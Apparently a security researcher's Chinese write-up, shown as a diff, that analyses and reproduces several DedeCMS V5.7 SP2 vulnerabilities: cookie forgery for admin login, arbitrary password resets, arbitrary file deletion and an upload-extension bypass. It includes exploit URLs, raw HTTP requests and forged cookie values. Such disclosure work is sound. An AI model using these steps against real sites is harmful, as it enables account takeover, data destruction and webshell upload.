@@ -1,0 +1,88 @@
+最近dedeCMS爆了好多洞(0day)，于是将最近的漏洞进行复现和整理便成为了本篇漏洞集合。期待师傅们的指导与交流。
+cookie伪造导致任意前台用户登录
+0x00 相关环境
+源码信息：DedeCMS-V5.7-UTF8-SP2-20180109
+问题文件： \DedeCMS-V5.7-UTF8-SP2\uploads\member\index.php
+漏洞类型：cookie伪造导致前台任意用户登录
+站点地址：http://www.dedecms.com/
+0x01 漏洞分析
+在文件\DedeCMS-V5.7-UTF8-SP2\uploads\member\index.php中的第125-166行中的代码块，用于更新最近访客记录及站点统计记录的代码，当满足$vtime - $last_vtime > 3600 || !preg_match('#,'.$uid.',#i', ','.$last_vid.',')的时候且$last_vid的值为空的时候，会令$last_vid = $uid，然后在第164行中使用PutCookie('last_vid', $last_vid, 3600*24, '/');将cookie下发的客户端。
+而dede在\DedeCMS-V5.7-UTF8-SP2\uploads\include\common.inc.php中的第108-117行中，使用的外部变量注册的方法进行变量声明，因此此处的$uid是用户可控的位置。
+跟入PutCookie方法，在文件\DedeCMS-V5.7-UTF8-SP2\uploads\include\helpers\cookie.helper.php中的第21-29行中，发现该方法，在该方法中的第27行中将值与配置文件中的$cfg_cookie_encode进行拼接，然后进行MD5和截断处理substr(md5($cfg_cookie_encode.$value),0,16)，然后下发到客户端。
+而在文件\DedeCMS-V5.7-UTF8-SP2\uploads\include\helpers\cookie.helper.php中的第54-75行中发现GetCookie方法的代码块，其中第65行用于校验客户端cookie是否进行了伪造，因此要进行cookie就自然想到要获取\DedeCMS-V5.7-UTF8-SP2\uploads\data\config.cache.inc.php文件中的内容，需要存在任意文件读取或下载的漏洞，当然还有另外一种方式，就是利用用户第一次登录时候下发cookie的方法(PutCookie)直接生成cookie，这样的cookie定会通过cookie校验的方法(GetCookie)。
+接下来需要查看登录位置的代码块，知晓登录时候cookie的生成规则是否是PutCookie，在文件\DedeCMS-V5.7-UTF8-SP2\uploads\include\memberlogin.class.php中输入合规的loginuser和loginpwd便会执行PutLoginInfo。
+跟入PutLoginInfo方法，在文件\DedeCMS-V5.7-UTF8-SP2\uploads\include\memberlogin.class.php中的第517-540行中发现了该方法的代码块，且在第531-539行中使用了PutCookie下发cookie。因此存在cookie的伪造漏洞。
+跟入检测登录状态的代码，在文件\DedeCMS-V5.7-UTF8-SP2\uploads\include\memberlogin.class.php的第160-241行发现代码块，其中第170行检测cookie中的DedeUserID参数的值，合规在第185行中，传入数据库查询获得结果后，把结果展示在页面上。
+0x02 漏洞复现
+情况一：
+由于mid在数据库中是int，所以要进行cookie的伪造需要注册用户名为要越权的用户mid数值，而admin默认为1。因此可以直接登录为admin。
+需要注册用户名为对应数据库中dede_member表中mid对应的值。如注册用户名为0001对应dede_member表中mid为1，便是admin的mid。
+然后访问如下请求获取伪造的cookie,
+http://127.0.0.1/member/index.php?uid=0001
+接下来使用0001账号登录，登录后的未修改的cookie。
+将last_vid的值赋给DedeUserID，last_vidckMd5的值赋给DedeUserIDckMd5修改后的cookie。
+修改后刷新页面登录到admin用户中。
+情况二：
+由于在\DedeCMS-V5.7-UTF8-SP2\uploads\include\memberlogin.class.php中的第170行中先进行cookie的校验再使用GetNum进行非数字和点的数据的替换，然后转成使用int型，拼接进入sql语句。
+在\DedeCMS-V5.7-UTF8-SP2\uploads\member\index.php文件中的第124行，当uid不为空的时候会require_once(DEDEMEMBER.'/inc/config_space.php')
+跟入config_space.php在\DedeCMS-V5.7-UTF8-SP2\uploads\member\inc\config_space.php文件中第29行使用了GetUserSpaceInfos方法。
+跟入GetUserSpaceInfos方法在\DedeCMS-V5.7-UTF8-SP2\uploads\member\inc\config_space.php文件中第118行发现该方法，且在第131行中使用了like的方式获取用户数据。
+因此可以注册类似于xxx1xx的用户，如bala1bala(当然仅需要实际环境中有包含用户名有包含1的即可)，然后在uid位置使用%1%让GetUserSpaceInfos方法可以正常获取数据，从而使代码能够进入PutCookie方法，从而生成伪造的cookie。
+然后对cookie进行替换，DedeUserID=%1%; DedeUserID__ckMd5=8983265c65c8d1ca;中会满足GetNum(GetCookie("DedeUserID"));后并转成int型1 ，再进行SQL拼接，因此便可以登录到admin。
+任意修改前台用户密码
+0x00 相关环境
+源码信息：DedeCMS-V5.7-UTF8-SP2-20180109
+问题文件： \DedeCMS-V5.7-UTF8-SP2\uploads\member\resetpassword.php
+漏洞类型：任意用户密码修改
+站点地址：http://www.dedecms.com/
+0x01 漏洞分析
+在\DedeCMS-V5.7-UTF8-SP2\uploads\member\resetpassword.php文件中的第96-95行，其中$row['safequestion'] == $safequestion && $row['safeanswer'] == $safeanswer代码是问题的关键，默认$row['safequestion']在数据中的内容为0，$row['safeanswer']在数据库中的结果为空，且变量$safeanswer与$safequestion是用户可控制的变量，又使用了 ==进行判断， 因此该判断规则存在弱类型问题。
+而在if(empty($safequestion)) $safequestion = '';语句中，要使empty($safequestion) 为false且$row['safequestion'] == $safequestion未true，所以可以使用字符型的0.0，进行绕过。
+绕过后会进入sn的方法，因此跟入sn方法，在\DedeCMS-V5.7-UTF8-SP2\uploads\member\inc\inc_pwd_functions.php文件中第150-172行发现代码块，且该方法会调用newmail方法。
+跟入newmail方法，在\DedeCMS-V5.7-UTF8-SP2\uploads\member\inc\inc_pwd_functions.php文件中第73-123行中发现代码块，然后当传入的$send为N的时候便会下发重置密码的链接，进行密码修改操作。
+0x02 漏洞复现
+先进行如下请求获取key
+http://127.0.0.1/member/resetpassword.php?dopost=safequestion&safequestion=0.0&safeanswer=&id=1
+然后点击跳转链接便可以重置密码
+http://127.0.0.1/member/resetpassword.php?dopost=getpasswd&id=1&key=UXqCX4lO
+任意重置后台用户密码
+0x00 相关环境
+源码信息：DedeCMS-V5.7-UTF8-SP2-20180109
+问题文件： \DedeCMS-V5.7-UTF8-SP2\uploads\member\edit_baseinfo.php
+漏洞类型：任意重置后台用户密码
+站点地址：http://www.dedecms.com/
+0x01 漏洞分析
+在\DedeCMS-V5.7-UTF8-SP2\uploads\member\edit_baseinfo.php文件中的第118-123行中，当使用admin用户登录前台进行密码修改的时候会顺带将admin的后台密码也进行修改了。
+0x02 漏洞复现
+先利用前台用户任意密码重置漏洞重置admin的前台密码，然后使用cookie伪造漏洞使用admin用户登录到前台在如下页面中进行密码重置，旧密码便是利用前台用户任意密码重置漏洞重置admin的前台密码(admin123)，新密码自行设置(123456)，设置好提交，操作步骤如下:
+先利用前台任意密码重置，将admin的密码重置为admin123，然后访问该http://127.0.0.1/member/edit_baseinfo.php链接进行密码修改，填入旧密码(admin123)，新密码(123456)与邮箱提交。
+修改后访问后台可以直接使用修改后的密码123456登录。
+前台任意文件删除
+0x00 相关环境
+源码信息：DedeCMS-V5.7-UTF8-SP2-20180109
+问题文件： \DedeCMS-V5.7-UTF8-SP2\uploads\member\album_add.php
+漏洞类型：任意文件删除
+站点地址：http://www.dedecms.com/
+0x01 漏洞分析
+问题在\DedeCMS-V5.7-UTF8-SP2\uploads\member\album_add.php文件的第88-103行中的代码，其中第88行中包含了/inc/archives_check.php文件对$litpic变量进行初始化，如下是/inc/archives_check.php文件对$litpic变量进行初始化的代码块。
+然后在\DedeCMS-V5.7-UTF8-SP2\uploads\member\album_add.php文件的第100行中使用$litpic = $litpicname;再次对$litpic变量进行赋值，而$litpicname之前未被初始化，所以可以使用变量覆盖的方式进行赋值，在文件的第94行中要求$formhtml==1为1才能进入$litpic = $litpicname，但是$formhtml在为空的时候会被赋值，所以可以通过变量覆盖为其赋值，使变量不为空，然后就可以进入$litpic = $litpicname。
+在\DedeCMS-V5.7-UTF8-SP2\uploads\member\archives_do.php文件的第161-162行中，当$row['issystem']!=-1的时候使用DelArc方法删除文档，$row['issystem']== -1的时候使用DelArcSg删除文档。
+而默认情况下issystem的值为1，因此可以直接跟入DelArc方法，在\DedeCMS-V5.7-UTF8-SP2\uploads\member\inc\inc_batchup.php文件中的第20-129行中发现该代码块，其中第72-76行中，从数据库中取出litpic列的值然后进行$litpic = DEDEROOT.$licp['litpic'];路径拼接，仅做了文件是否存在的判断，并未判断文件类型，就进行删除操作了，因此存在任意文件删除漏洞。
+0x02 漏洞复现
+先在会员中心->内容中心->系统模型内容->图集构造如下请求,添加formhtml参数的值为1，litpicname参数的值为要删除的文件路径，以网站根目录为基本目录，构造好后进行请求。
+POST /member/album_add.php HTTP/1.1 Host: 127.0.0.1 User-Agent: Mozilla/5.0 (Windows NT 10.0; WOW64; rv:56.0) Gecko/20100101 Firefox/56.0 Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8 Accept-Language: zh-CN,zh;q=0.8,en-US;q=0.5,en;q=0.3 Accept-Encoding: gzip, deflate Content-Type: multipart/form-data; boundary=---------------------------223472707522220 Content-Length: 1802 Referer: [http://127.0.0.1/member/album_add.php](http://127.0.0.1/member/album_add.php) Cookie: PHPSESSID=kublnhoscak1n73fseggmmmb33; DedeUserID=8; DedeUserID__ckMd5=03ad72531b31e585; DedeLoginTime=1516599960; DedeLoginTime__ckMd5=5451388fd8bc13e8; last_vtime=1516600044; last_vtime__ckMd5=3bbb694896a75541; last_vid=0001; last_vid__ckMd5=b40da23c41809b4e; ENV_GOBACK_URL=%2Fmember%2Fcontent_list.php%3Fchannelid%3D2 Connection: close Upgrade-Insecure-Requests: 1 -----------------------------223472707522220 Content-Disposition: form-data; name="dopost" save -----------------------------223472707522220 Content-Disposition: form-data; name="channelid" 2 -----------------------------223472707522220 Content-Disposition: form-data; name="imagebody" -----------------------------223472707522220 Content-Disposition: form-data; name="title" 1 -----------------------------223472707522220 Content-Disposition: form-data; name="tags" 2 -----------------------------223472707522220 Content-Disposition: form-data; name="writer" Thinking -----------------------------223472707522220 Content-Disposition: form-data; name="typeid" 6 -----------------------------223472707522220 Content-Disposition: form-data; name="mtypesid" 0 -----------------------------223472707522220 Content-Disposition: form-data; name="description" -----------------------------223472707522220 Content-Disposition: form-data; name="litpic"; filename="1.png" Content-Type: image/png ‰PNG -----------------------------223472707522220 Content-Disposition: form-data; name="imgmsg1" 11 -----------------------------223472707522220 Content-Disposition: form-data; name="vdcode" 5x3q -----------------------------223472707522220 Content-Disposition: form-data; name="formhtml" 1 -----------------------------223472707522220 Content-Disposition: form-data; name="litpicname" /1.txt -----------------------------223472707522220--
+在会员中心->内容中心->系统模型内容->图集中找到刚才发布的文章进行删除操作，执行结束后便会删除，前面定义好的litpicname的文件。
+GET /member/index.php?dopost=save HTTP/1.1 Host: 127.0.0.1 User-Agent: Mozilla/5.0 (Windows NT 10.0; WOW64; rv:56.0) Gecko/20100101 Firefox/56.0 Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8 Accept-Language: zh-CN,zh;q=0.8,en-US;q=0.5,en;q=0.3 Accept-Encoding: gzip, deflate Cookie: PHPSESSID=kublnhoscak1n73fseggmmmb33; DedeUserID=8; DedeUserID__ckMd5=03ad72531b31e585; DedeLoginTime=1516599960; DedeLoginTime__ckMd5=5451388fd8bc13e8 Connection: close Upgrade-Insecure-Requests: 1
+后台任意文件上传
+0x00 相关环境
+源码信息：DedeCMS-V5.7-UTF8-SP2-20180109
+问题文件： DedeCMS-V5.7-UTF8-SP2\uploads\include\dialog\select_images_post.php
+漏洞类型：后台任意文件上传
+站点地址：http://www.dedecms.com/
+0x01 漏洞分析
+在文件DedeCMS-V5.7-UTF8-SP2\uploads\include\dialog\select_images_post.php的第33行-40行中，其中34行将文件名中正则匹配到的内容替换为空白，且在36行检索文件名字中是否存在白名单中的文件格式，这两种做法均不是取文件的后缀名来进行判断的，所以存在被绕过的问题。
+而在文件DedeCMS-V5.7-UTF8-SP2\uploads\include\dialog\select_images_post.php的第55行-62行中，取文件的后缀名进行拼接和上传操作。存在检测方式与上传文件生成方式不一致的问题，导致被绕过。
+跟入$cfg_imgtype在\DedeCMS-V5.7-UTF8-SP2\uploads\data\config.cache.inc.php中的第18行发现了的上传类型格式限制。但是可以使用xxx.jpg.p%php，或xxx.jpg.p*hp等方式绕过，图片的格式满足config.cache.inc.php中的规定即可。
+0x02 漏洞复现
+该漏洞需要开启会员功能，然后可以在会员中心的编辑器中绕过上传限制。
+POST /include/dialog/select_images_post.php?CKEditor=body&CKEditorFuncNum=2&langCode=zh-cn HTTP/1.1 Host: 127.0.0.1 User-Agent: Mozilla/5.0 (Windows NT 10.0; WOW64; rv:56.0) Gecko/20100101 Firefox/56.0 Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8 Accept-Language: zh-CN,zh;q=0.8,en-US;q=0.5,en;q=0.3 Accept-Encoding: gzip, deflate Content-Type: multipart/form-data; boundary=---------------------------2029356716975 Content-Length: 620 Referer: [http://127.0.0.1/member/archives_add.php?channelid=6](http://127.0.0.1/member/archives_add.php?channelid=6) Cookie: UM_distinctid=160e48790ce5b-0fcbfb6867024d-12666d4a-13c680-160e48790cfb2; CNZZDATA5760804=cnzz_eid%3D193867769-1515662577-%26ntime%3D1516000016; PHPSESSID=b602af1f688b3422d78ac6e9b0adcec3; _csrf_name_d913aa85=7ff3c606297ef8b30217286e08ade98c; _csrf_name_d913aa85__ckMd5=694e999a0caaaf1e; DedeUserID=8; DedeUserID__ckMd5=9360696c07c8bfb8; DedeLoginTime=1516153005; DedeLoginTime__ckMd5=a4bb8919e8626b76; ENV_GOBACK_URL=%2Fmember%2Fcontent_list.php%3Fchannelid%3D6 Connection: close Upgrade-Insecure-Requests: 1 -----------------------------2029356716975 Content-Disposition: form-data; name="upload"; filename="1.png.p*hp" Content-Type: image/png ‰PNG
